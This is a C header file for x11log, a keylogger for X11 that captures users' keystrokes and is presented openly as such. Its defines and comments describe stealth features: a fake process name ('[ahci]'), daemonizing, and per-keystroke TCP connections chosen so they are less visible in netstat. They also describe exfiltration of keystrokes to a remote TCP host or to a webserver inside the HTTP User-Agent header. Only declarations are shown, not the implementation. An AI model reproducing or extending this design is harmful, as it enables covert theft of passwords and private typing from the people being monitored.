/* vim: set ts=4 sw=4: */
/* -- x11log.h
 * x11log - an unprivileged, userspace keylogger for X11
 *
 * This code is licensed under GPLv3.
 * (c) Erik Sonnleitner 2007/2015,
 *    es@delta-xi.net || erik.sonnleitner@fh-hagenberg.at
 * www.delta-xi.net, https://github.com/esonn/x11log
 *
 * TODOs and Bugs: Please refer to the official project-page on Github
 * */

#ifndef _X11LOG_H
#define _X11LOG_H

#define X11LOG_VERSION		"0.82-beta"

/* global defines */
#define MAX_KEYLEN			16
#define SHIFT_DOWN			1
#define LOCK_DOWN			2
#define CONTROL_DOWN		3
#define ALT_DOWN			4
#define DELAY				10000

#define VIS_PREFIX_ALT		'+'
#define VIS_PREFIX_CTRL		'^'
#define VIS_PREFIX_ALTGR	'%'
#define VIS_PREFIX_MENU		'$'
#define VIS_PREFIX_SUPER    '%'


/* The line_buf array holds all keystrokes until <ENTER> is pressed. It defaults
 * to LINEBUF_INC_LEN characters at first; if the buffer isn't big enough,
 * another LINEBUF_INC_LEN characters are appended to the array. */
//#define LINEBUF_INC_LEN		256		/* If line-buffer  */
#define LINEBUF_INC_LEN		10		/* If line-buffer  */

#define XKBD_WIDTH			32
#define BITS_PER_BYTE		8
#define X_DEFAULT_DISPLAY	":0.0"
#define PROCESS_FAKE_NAME	"[ahci]"

/*
 * For validation of port-number for remote logging (-r)
 * */
#define TCP_PORT_MIN		0
#define TCP_PORT_MAX		65535

/* HTTP keystroke logging is buffered. This is done, because users typically
 * type faster, than a webserver is accepting requests; therefore, and for
 * better readability on the server, keystrokes are buffered until a certain
 * number of keystrokes is reached, and then sent to webserver. */
#define KEYSTROKE_BUFFER_SIZE		64

/* Which header field to use */
#define HTTP_HEADER_FIELD	"User-Agent: "

#define ERR_SOCKET			-1
#define ERR_CONNECT			-2
#define ERR_DNS				-3

/* macros */
#define SWAP(a,b,c) c t;t=(a);(a)=(b);(b)=(t);

/* structs */
struct config_struct {
	char* logfile;			/* path to logfile, if not console output  */
	FILE* logfd;			/* file descriptor for general output */
	char* display;			/* X11 display, like $DISPLAY env variable */

	int   log_remote_inet;	/* log to remote host? 0: no, 1: yes */
	char* remote_addr;		/* remote host to log to, as "hostname:port" */
	char* host;				/* hostname or IP as string */
	long  port;				/* port */

	int   silent;			/* no log to stdout */
	int   daemonize;		/* daemonize process */
	int   obfuscate;		/* obfuscate process name */
	char* process_fakename;	/* process name, if obfuscation is used */

#ifdef _HAVE_CURL
	int   log_remote_http;	/* log to webserver; 0: no, 1: yes */
	int   log_remote_http_nodelay;	/* immediately send HTTP GET request? */
	int   log_remote_http_post;	/* use POST instead of GET */
#endif //_HAVE_CURL
};


struct linebuf_struct {
	char* buf;
	int size;
} linebuf;

struct kdb_layout_ger_struct {
	const char cur;
	const char mod;
	//const char replacement;
	const wchar_t replacement;
};

const struct kdb_layout_ger_struct kbd_layout_ger[] = {
	{'q', VIS_PREFIX_ALTGR, '@'},
	{'1', VIS_PREFIX_ALTGR, '¹'},
	{'2', VIS_PREFIX_ALTGR, '²'},
	{'3', VIS_PREFIX_ALTGR, '³'},
	{'4', VIS_PREFIX_ALTGR, '¼'},
	{'5', VIS_PREFIX_ALTGR, '½'},
	{'6', VIS_PREFIX_ALTGR, '¬'},
	{'7', VIS_PREFIX_ALTGR, '{'},
	{'8', VIS_PREFIX_ALTGR, '['},
	{'9', VIS_PREFIX_ALTGR, ']'},
	{'0', VIS_PREFIX_ALTGR, '}'},
//	{'ß', VIS_PREFIX_ALTGR, '\\'},
	{ 0, 0, 0 }
};

/* globals */
const struct remap_struct {
	char src[20], dst[8];
} remap[] = {
	{"Return","\n"},
	{"Escape","[ESC]"},
	{"Delete", ">D"},
	// {"Shift",""},
	// {"Control",""},
	{"space", " "},
	{"exclam", "!"},
	{"quotedbl", "\""},
	{"numbersign", "#"},
	{"dollar", "$"},
	{"percent", "%"},
	{"ampersand", "&"},
	{"apostrophe", "'"},
	{"parenleft", "("},
	{"parenright", ")"},
	{"asterisk", "*"},
	{"plus", "+"},
	{"comma", ","},
	{"minus", "-"},
	{"period", "."},
	{"slash", "/"},
	{"colon", ":"},
	{"semicolon", ";"},
	{"less", "<"},
	{"equal", "="},
	{"greater", ">"},
	{"question", "?"},
	{"At", "@"},
	{"bracketleft", "["},
	{"backslash", "\\"},
	{"bracketright", "]"},
	{"asciicircum", "^"},
	{"underscore", "_"},
	{"grave", "`"},
	{"braceleft", "{"},
	{"bar", "|"},
	{"braceright", "}"},
	{"asciitilde", "~"},
	{"odiaeresis","ö"},
	{"adiaeresis","ä"},
	{"udiaeresis","ü"},
	{"Odiaeresis","Ö"},
	{"Adiaeresis","Ä"},
	{"Udiaeresis","Ü"},
	{"ssharp","ß"},
	{"section","$"},
	{"acute","´"},
	{"degree","°"},

/* If _UNICODE is defined, let's replace some special characters with
 * more representive single-characters unicode equivalents for better
 * readability (this should be the default). */
#ifdef _UNICODE
	{"BackSpace","←"},

	{"Up","↑"},
	{"Down","↓"},
	{"Left","←"},
	{"Right","→"},

	{"Tab","↓"},
#else 
	//{"BackSpace","←"},

	//{"Up","↑"},
	//{"Down","↓"},
	//{"Left","←"},
	//{"Right","→"},

	{"Tab","\t"},
#endif

	{"Control_L",        VIS_PREFIX_CTRL},        /* Left CTRL key */
	{"Control_R",        VIS_PREFIX_CTRL},        /* Right CTRL key */
	{"Alt_L",            VIS_PREFIX_ALT},         /* Left Alt key */
	{"Alt_R",            VIS_PREFIX_ALT},         /* Right Alt key */
	{"Menu",             VIS_PREFIX_MENU},        /* Right Windows-Menu key */
	{"ISO_Level3_Shift", VIS_PREFIX_ALTGR},       /* Alt-Gr */
	{"Super_L",          VIS_PREFIX_SUPER},       /* Left Windows key*/

	{"Shift_L",""},
	{"Shift_R",""},

	{"",""}
};




/* * * * * * * * * * * 
 * Funcion prototypes
 * * * * * * * * * * * */

/* decodeKey()
 * checks keycodes and mods, and returns a human-readable interpretation of the
 * keyboard status.
 * */
char*		decodeKey		(int code, int down, int mod);


/* getMods()
 * Read the mod key(s) of the keymap state and return the present mods
 * */
int			getMods			(char *kbd);


/* getbit()
 * Retrieve one specific bit (idx) of a keymap vector
 * */
int			getbit			(char *kbd, int idx);


/* signal_handler()
 * Signal handler for SIGTERM, SIGINT and SIGHUP. Only set global flags, which
 * are regularly checked in main loop; this prevents us from requiring the
 * main configuration structure on global scope.
 * */
void		signal_handler	(int sig);


/* fatal()
 * fatal: Print error message and abort execution.
 * */
void		fatal			(const char * msg);


/* initialize()
 * Initialization stuff: parse arguments, define signal handlers, define
 * output stream, set default options. Returns time when init() finished.
 * */
struct tm*	initialize		(int argc, char ** argv, struct config_struct* opts);


/* transmit_keystroke_inet()
 * Transmit keystroke to a remote host, where some daemon is required to listen
 * at the given port. The TCP connection is newly established upon every call
 * to this function; this is inefficient, but also offers advantages (e.g.,
 * chances are lower that the user will see a constant TCP stream in netstat
 * output, etc). Returns the number of bytes read, or negative value on error.
 * */
int			transmit_keystroke_inet(char* key, struct config_struct *opts);


/* log()
 * printf() wrapper, taking care of debug levels
 * */
void		log				(int level, FILE* stream, const char *fmt, ...);


/* daemonize()
 * Daemonize logger. If a process_name is given, the name of the newly created
 * child as it appears within the process table, is altered. Returns pid of
 * child process, or exits on error.
 * */
int			daemonize		(char* child_process_name, struct config_struct* cfg);


/* smalloc()
 * Secure malloc
 * */
void*		smalloc			(size_t size);


/* clean_exit()
 * Clean up and exit program: Close open file descriptors and free memory.
 * */
void		clean_exit		(struct config_struct* cfg);


#ifdef _HAVE_CURL
/* transmit_keystroke_http()
 * Transmit keystrokes to web-server within a HTTP request. For various reasons,
 * not every single keystroke is transmitted via a separate request, but a
 * keystroke buffer is being filled up to KEYSTROKE_BUFFER_SIZE, and then sent
 * as HTTP GET request to a webserver (default: 64 bytes). Keystrokes are being
 * sent as value of a HTTP header field (HTTP_HEADER_FIELD, default is User-
 * Agent).
 * */
int			transmit_keystroke_http(char* key, struct config_struct *cfg, int sendnow);
/* curl_blackhole()
 * This is just a dummy write-handler, in order to prevent libcurl from
 * printing the web-server response. 
 * */
size_t curl_blackhole(void* unused, size_t size, size_t nmemb, void* none);
#endif

/* If -l is specified, update the line-buffer (which is flushed only after
 * ENTER is pressed. */
int			linebuf_update	(const char* s, struct config_struct* config);

/* Replace a sequence of 2 keystrokes into a single new one. This can be
 * particularly interesting with certain modifier keys (e.g., on German
 * keyboard layouts, '@' is typed AltGr+q. Instead of showing VIS_MOD_XXX + q,
 * we can replace it with the correct character. */
void		merge_split_keys(char key, const char mod, const char replacement);

/* Print usage/help */
void		print_usage(char* basename);


#endif // _X11LOG_H

